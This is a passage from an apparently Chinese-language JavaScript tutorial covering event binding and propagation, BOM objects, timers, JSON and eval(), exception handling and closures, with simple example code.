class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="number">3</span>);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>attachEvent()</p><ul><li>在IE8中可以使用attachEvent()来绑定事件</li><li>这个方法也可以同时为一个事件绑定多个处理函数，不同的是它是<code>后绑定先执行</code>，执行顺序和addEventListener()相反</li><li>参数：<ul><li>1.事件的字符串，要on</li><li>2.回调函数<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">btn01.<span class="title function_">attachEvent</span>(<span class="string">&quot;onclick&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">btn01.<span class="title function_">attachEvent</span>(<span class="string">&quot;onclick&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="number">2</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">btn01.<span class="title function_">attachEvent</span>(<span class="string">&quot;onclick&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="number">3</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h2 id="事件传播"><a href="#事件传播" class="headerlink" title="事件传播"></a>事件传播</h2><ul><li>W3C将事件传播分成了三个阶段<ul><li>1.捕获阶段<ul><li>在捕获阶段时从最外层的祖先元素，向目标元素进行事件的捕获，但是默认此时不会触发事件</li></ul></li><li>2.目标阶段<ul><li>事件捕获到目标元素，捕获结束后开始在目标元素上触发事件</li></ul></li><li>3.冒泡阶段<ul><li>事件从目标元素向他的祖先元素传递，依次触发祖先元素上的事件</li></ul></li></ul></li><li>如果希望在捕获阶段就触发事件，可以将addEventListener()的第三个参数设置为true<ul><li>一般情况下我们不会希望在捕获阶段触发事件，所以这个参数一般都是false</li></ul></li><li>IE8及以下的浏览器中没有捕获阶段<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * 分别为三个div绑定单击响应函数</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">var</span> box1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box1&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> box2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box2&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> box3 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box3&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">bind</span>(box1,<span class="string">&quot;click&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;我是box1的响应函数&quot;</span>)</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">bind</span>(box2,<span class="string">&quot;click&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;我是box2的响应函数&quot;</span>)</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">bind</span>(box3,<span class="string">&quot;click&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;我是box3的响应函数&quot;</span>)</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//定义一个函数，用来为指定元素绑定响应函数</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * addEventListener()中的this，是绑定事件的对象</span></span><br><span class="line"><span class="comment"> * attachEvent()中的this，是window</span></span><br><span class="line"><span class="comment"> *  需要统一两个方法this</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 参数：</span></span><br><span class="line"><span class="comment"> * obj 要绑定事件的对象</span></span><br><span class="line"><span class="comment"> * eventStr 事件的字符串(不要on)</span></span><br><span class="line"><span class="comment"> *  callback 回调函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bind</span>(<span class="params">obj , eventStr , callback</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(obj.<span class="property">addEventListener</span>)&#123;</span><br><span class="line">    <span class="comment">//大部分浏览器兼容的方式</span></span><br><span class="line">    obj.<span class="title function_">addEventListener</span>(eventStr , callback , <span class="literal">true</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this是谁由调用方式决定</span></span><br><span class="line"><span class="comment">     * callback.call(obj)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//IE8及以下</span></span><br><span class="line">    obj.<span class="title function_">attachEvent</span>(<span class="string">&quot;on&quot;</span>+eventStr , <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="comment">//在匿名函数中调用回调函数</span></span><br><span class="line">      callback.<span class="title function_">call</span>(obj);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h2><ul><li>onkeydown<ul><li>按键被按下</li><li>对于onkeydown来说如果一直按着某个按键不松手，则事件会一直触发</li><li>当onkeydown连续触发时，第一次和第二次之间会间隔稍微长一点，其他的会非常的快，这种设计是为了防止误操作的发生。</li></ul></li><li>onkeyup<ul><li>按键被松开</li></ul></li><li>键盘事件一般都会绑定给一些可以获取到焦点的对象或者是document</li></ul><hr><h1 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h1><h2 id="BOM介绍"><a href="#BOM介绍" class="headerlink" title="BOM介绍"></a>BOM介绍</h2><ul><li><p>浏览器对象模型</p></li><li><p>BOM可以通过JS来操作浏览器</p></li><li><p>在BOM中提供了一组对象，用来完成对浏览器的操作</p></li><li><p>BOM对象</p><ul><li><p>Window</p><ul><li>代表的是整个浏览器的窗口，同时window也是网页中的全局对象</li></ul></li><li><p>Navigator</p><ul><li>代表的当前浏览器的信息，通过该对象可以来识别不同的浏览器</li></ul></li><li><p>Location</p><ul><li>代表当前浏览器的地址栏信息，通过Location可以获取地址栏信息，或者操作浏览器跳转页面</li></ul></li><li><p>History</p><ul><li>代表浏览器的历史记录，可以通过该对象来操作浏览器的历史记录<ul><li>由于隐私原因，该对象不能获取到具体的历史记录，只能操作浏览器向前或向后翻页</li><li>而且该操作只在当次访问时有效</li></ul></li></ul></li><li><p>Screen</p><ul><li>代表用户的屏幕的信息，通过该对象可以获取到用户的显示器的相关的信息</li></ul></li></ul></li><li><p>这些BOM对象在浏览器中都是作为window对象的属性保存的，可以通过window对象来使用，也可以直接使用</p></li></ul><h2 id="Navigator"><a href="#Navigator" class="headerlink" title="Navigator"></a>Navigator</h2><ul><li>由于历史原因，Navigator对象中的大部分属性都已经不能帮助我们识别浏览器了</li><li>一般我们只会使用userAgent来判断浏览器的信息，<ul><li>userAgent是一个字符串，这个字符串中包含有用来描述浏览器信息的内容，</li><li>不同的浏览器会有不同的userAgent<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ua = navigator.<span class="property">userAgent</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="regexp">/firefox/i</span>.<span class="title function_">test</span>(ua))&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;你是火狐！！！&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="regexp">/chrome/i</span>.<span class="title function_">test</span>(ua))&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;你是Chrome&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="regexp">/msie/i</span>.<span class="title function_">test</span>(ua))&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;你是IE浏览器~~~&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;ActiveXObject&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>)&#123; </span><br><span class="line">  <span class="comment">// 如果通过UserAgent不能判断，还可以通过一些浏览器中特有的对象，来判断浏览器的信息</span></span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;你是IE11，枪毙了你~~~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><ul><li>对象可以用来操作浏览器向前或向后翻页</li><li>length<ul><li>属性，可以获取到当成访问的链接数量</li></ul></li><li>back()<ul><li>可以用来回退到上一个页面，作用和浏览器的回退按钮一样</li></ul></li><li>forward()<ul><li>可以跳转下一个页面，作用和浏览器的前进按钮一样</li></ul></li><li>go()<ul><li>可以用来跳转到指定的页面</li><li>它需要一个整数作为参数<ul><li>1:表示向前跳转一个页面 相当于forward()</li><li>2:表示向前跳转两个页面</li><li>-1:表示向后跳转一个页面</li><li>-2:表示向后跳转两个页面<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">//获取按钮对象</span></span><br><span class="line">  <span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>);</span><br><span class="line">  btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(history.<span class="property">length</span>);</span><br><span class="line">    history.<span class="title function_">back</span>();</span><br><span class="line">    history.<span class="title function_">forward</span>();</span><br><span class="line">    history.<span class="title function_">go</span>(-<span class="number">2</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h2 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h2><ul><li>该对象中封装了浏览器的地址栏的信息（当前页面的完整路径）</li><li>直接将location属性修改为一个完整的路径，或相对路径，则我们页面会自动跳转到该路径，并且会生成相应的历史记录<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">location = <span class="string">&quot;http://www.baidu.com&quot;</span>;</span><br><span class="line">location = <span class="string">&quot;01.BOM.html&quot;</span>;</span><br></pre></td></tr></table></figure></li><li>assign()<ul><li>用来跳转到其他的页面，作用和直接修改location一样<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">location.<span class="title function_">assign</span>(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li>reload()<ul><li>用于重新加载当前页面，作用和刷新按钮一样</li><li>如果在方法中传递一个true，作为参数，则会强制清空缓存刷新页面<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">location.<span class="title function_">reload</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li>replace()<ul><li>可以使用一个新的页面替换当前页面，调用完毕也会跳转页面</li><li>不会生成历史记录，不能使用回退按钮回退<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">location.<span class="title function_">replace</span>(<span class="string">&quot;01.BOM.html&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h1 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h1><h2 id="setInterval"><a href="#setInterval" class="headerlink" title="setInterval()"></a>setInterval()</h2><ul><li>定时调用</li><li>可以将一个函数，每隔一段时间执行一次</li><li>参数：<ul><li>1.回调函数，该函数会每隔一段时间被调用一次</li><li>2.每次调用间隔的时间，单位是毫秒</li></ul></li><li>返回值：<ul><li>返回一个Number类型的数据</li><li>这个数字作为定时器的唯一标识<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使count中的内容，自动切换</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> timer = <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    count.<span class="property">innerHTML</span> = num ++ <span class="comment">// 第一次的值是1，赋值结束后，num值加1</span></span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">11</span>)&#123;</span><br><span class="line">        <span class="comment">// 关闭定时器</span></span><br><span class="line">      <span class="built_in">clearInterval</span>(timer)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li>工作原理：<ul><li>每隔一段时间(如每隔2s）就会执行，一直重复</li></ul></li><li>这样会存在问题：<ul><li>设定一个定时器a每隔2s执行一次，如果a执行的时间（executiveTime）大于时间间隔(2s)，那么，第一次执行的a还没执行完第一次，就开始执行第二次了。</li><li>js巧妙地避免了这个问题——即等到定时器的代码执行完后，再去将定时器的代码加入到队列中，所以定时器代码加入队列的最小时间间隔即指定间隔（因为理想状态是是定时器的执行时间在时间间隔内完成）</li></ul></li><li>使用setInterval的问题 <ul><li>某些间隔会被跳过——如设置每个1s执行一次，如果该定时器代码执行时间大于1s，或者正好等于1s，那么，相当于代码执行时间正好等于间隔时间，那么，这个间隔时间就被执行时间占据了，所以就没有了间隔时间即没有间隔。</li><li>多个定时器代码执行之间的间隔可能会比预期小<ul><li>因为代码执行时间会长一点（因为队列并不总是空闲的，所以要排队等待执行），导致时间间隔变小。</li></ul></li><li>以上两个问题的解决方法：使用递归调用延时器，代替定时器<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">//执行代码</span></span><br><span class="line">  <span class="comment">//xxxx</span></span><br><span class="line">  <span class="comment">//xxxx</span></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="variable language_">arguments</span>.<span class="property">callee</span>,<span class="number">1000</span>) <span class="comment">// arguments.callee的作用是获取当前执行函数的引用，并设置新的相同的延时器再来一次，即递归调用</span></span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><h2 id="clearInterval"><a href="#clearInterval" class="headerlink" title="clearInterval()"></a>clearInterval()</h2></li></ul></li><li>关闭一个定时器</li><li>方法中需要定时器的标识作为参数，这样将关闭标识对应的定时器</li></ul><h2 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout()"></a>setTimeout()</h2><ul><li>延时调用</li><li>延时调用函数不会马上执行，而是间隔一段时间再执行，而且只执行一次</li><li>延时调用和定时调用的区别<ul><li>定时调用会执行多次，</li><li>延时调用只会执行一次</li></ul></li><li>延时调用和定时调用是可以相互替代的，在开发中可以根据自己需要去选择</li><li>工作原理<ul><li>当设定一个延时器是5s后进行时，并不代表它5s后就立即执行，只是代表它5s后会被加入队列，如果5s后，队列没有其他东西，那么延时器的代码会立即执行，否则会延迟执行。</li><li>指定的时间间隔（如设置5s后执行），表示何时将延时器加入到队列，而不是何时真正执行代码。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> timer = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(num++)</span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="clearTimeout"><a href="#clearTimeout" class="headerlink" title="clearTimeout()"></a>clearTimeout()</h2><ul><li>关闭一个延时调用</li><li>方法中需要延时调用的标识作为参数，这样将关闭标识对应的延时调用</li></ul><hr><h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><ul><li>JavaScript Object Notation JS对象表示法</li><li>JS中的对象只有JS自己认识，其他的语言都不认识</li><li>JSON就是一个特殊格式的字符串，这个字符串可以被任意的语言所识别，并且可以转换为任意语言中的对象，JSON在开发中主要用来数据的交互</li><li>JSON和JS对象的格式一样，只不过JSON字符串中的<code>属性名必须加双引号</code>,其他的和JS语法一致</li><li>文件扩展名为.json</li><li>JSON分类：<ul><li>对象{}</li><li>数组[]</li></ul></li><li>JSON中允许的值：<ul><li>1.字符串</li><li>2.数值</li><li>3.布尔值</li><li>4.null</li><li>5.对象</li><li>6.数组<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JSON字符串</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;&#123;&quot;name&quot;:&quot;孙悟空&quot;,&quot;age&quot;:18,&quot;gender&quot;:&quot;男&quot;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li>在JS中，为我们提供了一个工具类，就叫JSON, 这个对象可以帮助我们将一个JSON转换为JS对象，也可以将一个JS对象转换为JSON</li><li>将JSON字符串转换为JS中的对象<ul><li>JSON.parse()<ul><li>可以将以JSON字符串转换为js对象</li><li>它需要一个JSON字符串作为参数，会将该字符串转换为JS对象并返回</li></ul></li></ul></li><li>将JS对象转换为JSON字符串<ul><li>JSON.stringify()<ul><li>可以将一个JS对象转换为JSON字符串</li><li>需要一个js对象作为参数，会返回一个JSON字符串</li></ul></li></ul></li><li>eval()<ul><li>这个函数可以用来执行一段字符串形式的JS代码，并将执行结果返回</li><li>如果使用eval()执行的字符串中含有{},它会将{}当成是代码块</li><li>如果不希望将其当成代码块解析，则需要在字符串前后各加一个()</li><li>eval()这个函数的功能很强大，可以直接执行一个字符串中的js代码，但是在开发中尽量不要使用，首先它的执行性能比较差，然后它还具有安全隐患<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;&#123;&quot;name&quot;:&quot;孙悟空&quot;,&quot;age&quot;:18,&quot;gender&quot;:&quot;男&quot;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">eval</span>(<span class="string">&quot;(&quot;</span>+str+<span class="string">&quot;)&quot;</span>); <span class="comment">// 同JSON.parse()</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><ul><li>错误和异常的区别<ul><li>错误（Error）是在代码运行之前出现的，在运行 JavaScript 程序之前，JavaScript 解释器会先对代码进行检查，如果代码有误，例如某些语法错误，浏览器就会报出相应的错误，只有将错误修正后，代码才能运行。</li><li>异常（Exception）是在代码运行中出现的，例如调用某个未定义的方法、读取不存在的文件等。在出现异常之前，代码的运行并不受影响，当出现异常时，会在浏览器控制台输出错误信息，并终止程序的运行。 <h2 id="try-catch-语句"><a href="#try-catch-语句" class="headerlink" title="try catch 语句"></a>try catch 语句</h2></li><li>捕获异常，并做出相应处理</li><li>当 try 语句块中的代码出现异常时，会创建并抛出一个 Error 对象（例如上面代码内catch(error)中的 error），对象中包含两个属性，如下所示：<ul><li>name：错误的类型；</li><li>message：对错误的描述信息。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语法格式</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 可能会发生异常的代码</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">    <span class="comment">// 发生异常时要执行的操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例子</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> title = <span class="string">&quot;JavaScript&quot;</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">write</span>(title);</span><br><span class="line">  <span class="comment">// 调用一个未定义的变量</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">write</span>(str);</span><br><span class="line">  <span class="comment">// 若发生错误，则不会执行以下行</span></span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;所有语句都已成功执行。&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(error) &#123;</span><br><span class="line">  <span class="comment">// 处理错误</span></span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;错误信息: &quot;</span> + error.<span class="property">message</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 继续执行下面的代码</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;p&gt;Hello World!&lt;/p&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="try-catch-finally-语句"><a href="#try-catch-finally-语句" class="headerlink" title="try catch finally 语句"></a>try catch finally 语句</h2></li></ul></li></ul></li><li>无论 try 语句块中的代码是否发生错误，finally 语句中的代码都会执行<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接收用户输入的参数</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="title function_">prompt</span>(<span class="string">&quot;输入一个 0 到 100 的数字&quot;</span>);</span><br><span class="line"><span class="comment">// 获取当前时间</span></span><br><span class="line"><span class="keyword">var</span> start = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">pow</span>(num, num)); <span class="comment">// 指数幂的基</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;输入的值无效!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">  <span class="comment">// 显示执行代码所用的时间</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;代码执行花费了：&quot;</span> + (<span class="title class_">Date</span>.<span class="title function_">now</span>() - start) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输入123</span></span><br><span class="line"><span class="comment">// 代码执行花费了：0ms</span></span><br></pre></td></tr></table></figure><h2 id="抛出错误"><a href="#抛出错误" class="headerlink" title="抛出错误"></a>抛出错误</h2></li><li>throw expression<ul><li>其中 expression 为要抛出的异常，可以是任何类型的值，例如对象、字符串、数组等，推荐使用对象类型</li><li>JavaScript 中内置了一个 Error() 函数来创建要抛出的错误对象<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">squareRoot</span>(<span class="params">number</span>) &#123;</span><br><span class="line"><span class="comment">// 如果数字为负数，则抛出错误</span></span><br><span class="line">  <span class="keyword">if</span>(number &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;抱歉，无法计算负数的平方根！&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">sqrt</span>(number));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="title function_">squareRoot</span>(<span class="number">16</span>);</span><br><span class="line">  <span class="title function_">squareRoot</span>(<span class="number">625</span>);</span><br><span class="line">  <span class="title function_">squareRoot</span>(-<span class="number">9</span>);</span><br><span class="line">  <span class="title function_">squareRoot</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="comment">// 若抛出错误，则不会执行下面的行</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;所有函数都执行成功。&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="comment">// 处理错误</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 运行结果如下：</span></span><br><span class="line"><span class="comment">* 4</span></span><br><span class="line"><span class="comment">* 25</span></span><br><span class="line"><span class="comment">* 抱歉，无法计算负数的平方根！</span></span><br><span class="line"><span class="comment">* */</span></span><br></pre></td></tr></table></figure><h2 id="错误类型"><a href="#错误类型" class="headerlink" title="错误类型"></a>错误类型</h2><table><thead><tr><th align="center">错误类型</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">EvalError</td><td align="center">使用 eval() 函数时发出错误，会抛出该错误</td></tr><tr><td align="center">InternalError</td><td align="center">由 JavaScript 引擎内部错误导致的异常，会抛出该错误</td></tr><tr><td align="center">RangeError</td><td align="center">范围错误，当使用了超出允许范围的数值时，会抛出该错误</td></tr><tr><td align="center">SyntaxError</td><td align="center">语法错误，当代码中存在任何语法错误时，会抛出该错误</td></tr><tr><td align="center">TypeError</td><td align="center">类型错误，当使用的值不是预期类型时，会抛出该错误，例如对数字调用字符串方法，对字符串调用数组方法等</td></tr><tr><td align="center">URIError</td><td align="center">URI 错误，当使用 URI 相关函数但传入 URI 参数时，会抛出该错误</td></tr><tr><td align="center">ReferenceError</td><td align="center">参数错误，当尝试使用未定义的变量、函数、对象时，会抛出该错误</td></tr></tbody></table></li></ul></li></ul><hr><h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><h2 id="认识闭包"><a href="#认识闭包" class="headerlink" title="认识闭包"></a>认识闭包</h2><ul><li><p>闭包，指的就是一个<code>函数</code>。当<code>两个函数彼此嵌套</code>时，<code>内部的函数</code>就是<code>闭包</code></p></li><li><p>因为在 JavaScript 中，函数属于对象，对象又是属性的集合，而属性的值又可以是对象，所以我们可以在函数内部再定义函数。例如在函数 A 中定义了函数 B，然后在函数外部调用函数 B，这个过程就是闭包。</p></li><li><p>闭包的形成条件<code>内部函数需要通过外部函数 return 给返回出来</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以下代码就构成了一个闭包，其实就是函数 fun。</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">funOne</span>(<span class="params"></span>)&#123;    <span class="comment">// 外部函数</span></span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">0</span>;      <span class="comment">// 局部变量</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">funTwo</span>(<span class="params"></span>)&#123;   <span class="comment">// 内部函数</span></span><br><span class="line">        num++;                 </span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> funTwo;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fun = <span class="title function_">funOne</span>();             <span class="comment">// 返回函数 funTwo</span></span><br></pre></td></tr></table></figure><h2 id="闭包的用途"><a href="#闭包的用途" class="headerlink" title="闭包的用途"></a>闭包的用途</h2></li><li><p>当需要在函数中定义一些变量，并且希望这些变量能够一直保存在内存中，同时不影响函数外的全局变量时，就可以使用闭包</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">funOne</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(num)</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">funTwo</span>(<span class="params"></span>)&#123;</span><br><span class="line">        num++;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> funTwo;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fun = <span class="title function_">funOne</span>();</span><br><span class="line"><span class="title function_">fun</span>();      <span class="comment">// 输出：0 输出：1</span></span><br><span class="line"><span class="title function_">fun</span>();      <span class="comment">// 输出：2</span></span><br><span class="line"><span class="title function_">fun</span>();      <span class="comment">// 输出：3</span></span><br><span class="line"><span class="title function_">fun</span>();      <span class="comment">// 输出：4</span></span><br><span class="line"><span class="comment">// num 是外部函数 funOne() 中的一个变量，它的值在内部函数 funTwo() 中被修改，函数 funTwo() 每执行一次就会将 num 加 1。根据闭包的特点，函数 funOne() 中的变量 num 会一直保存在内存中</span></span><br></pre></td></tr></table></figure></li><li><p>GC（垃圾回收）机制</p><ul><li>在 JavaScript 中，如果一个对象不再被引用，那么这个对象就会被 GC 回收，否则这个对象会一直保存在内存中。在上面的例子中，内部函数 funTwo() 定义在外部函数 funOne() 中，因此 funTwo() 依赖于 funOne()，而全局变量 fun 又引用了 funTwo()，所以 funOne() 间接的被 fun 引用。因此 funOne() 不会被 GC 回收，会一直保存在内存中</li></ul></li></ul><h2 id="闭包的高级用法"><a href="#闭包的高级用法" class="headerlink" 